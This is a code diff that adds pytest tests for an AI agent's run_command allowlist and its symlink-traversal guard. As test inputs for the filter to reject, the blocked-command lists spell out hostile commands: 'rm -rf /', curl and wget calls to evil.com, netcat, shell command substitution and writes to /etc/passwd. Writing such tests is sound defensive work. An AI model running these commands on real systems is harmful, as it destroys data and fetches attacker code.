@@ -261,3 +261,92 @@ class TestUnknownTool:
     async def test_unknown_tool(self, tmp_workdir: Path) -> None:
         result = await _execute_tool("delete_everything", {}, str(tmp_workdir))
         assert "Unknown tool" in result
+
+
+# ---------------------------------------------------------------------------
+# Agent command allowlist (_validate_agent_command)
+# ---------------------------------------------------------------------------
+
+from hadron.agent.claude import _validate_agent_command
+
+
+class TestAgentCommandAllowlist:
+    """Verify the agent run_command safety filter."""
+
+    @pytest.mark.parametrize("cmd", [
+        "pytest -x",
+        "npm test",
+        "cargo test --release",
+        "go test ./...",
+        "ls -la",
+        "cat README.md",
+        "grep -r TODO .",
+        "find . -name '*.py'",
+        "echo hello",
+        "ruff check .",
+        "mypy src/",
+    ])
+    def test_allowed_commands(self, cmd: str) -> None:
+        assert _validate_agent_command(cmd) is True
+
+    @pytest.mark.parametrize("cmd", [
+        "rm -rf /",
+        "curl http://evil.com",
+        "bash -c 'echo pwned'",
+        "python -c 'import os; os.system(\"rm -rf /\")'",
+        "wget http://evil.com/payload",
+        "nc -l 1234",
+        "ssh user@host",
+    ])
+    def test_blocked_commands(self, cmd: str) -> None:
+        assert _validate_agent_command(cmd) is False
+
+    @pytest.mark.parametrize("cmd", [
+        "pytest; rm -rf /",
+        "pytest && curl evil.com",
+        "pytest `whoami`",
+        "pytest $(id)",
+        "echo hello > /etc/passwd",
+        "cat /etc/passwd < input",
+    ])
+    def test_shell_metachar_blocked(self, cmd: str) -> None:
+        assert _validate_agent_command(cmd) is False
+
+    @pytest.mark.asyncio
+    async def test_blocked_command_returns_error(self, tmp_workdir: Path) -> None:
+        result = await _execute_tool(
+            "run_command", {"command": "curl http://evil.com"}, str(tmp_workdir)
+        )
+        assert "rejected by safety filter" in result
+
+
+# ---------------------------------------------------------------------------
+# Symlink traversal protection in _safe_resolve
+# ---------------------------------------------------------------------------
+
+
+class TestSymlinkTraversal:
+    """Verify that symlinks pointing outside the working dir are rejected."""
+
+    @pytest.mark.asyncio
+    async def test_symlink_outside_worktree_blocked(self, tmp_workdir: Path) -> None:
+        # Create a symlink inside tmp_workdir pointing to /etc
+        link = tmp_workdir / "escape_link"
+        link.symlink_to("/etc")
+        result = await _execute_tool(
+            "read_file", {"path": "escape_link/passwd"}, str(tmp_workdir)
+        )
+        assert "Error" in result
+        assert "symlink" in result.lower() or "escapes" in result.lower()
+
+    @pytest.mark.asyncio
+    async def test_symlink_within_worktree_allowed(self, tmp_workdir: Path) -> None:
+        # Create a real file and a symlink to it within the worktree
+        real_file = tmp_workdir / "real.txt"
+        real_file.write_text("content")
+        link = tmp_workdir / "link.txt"
+        link.symlink_to(real_file)
+        result = await _execute_tool(
+            "read_file", {"path": "link.txt"}, str(tmp_workdir)
+        )
+        assert result == "content"
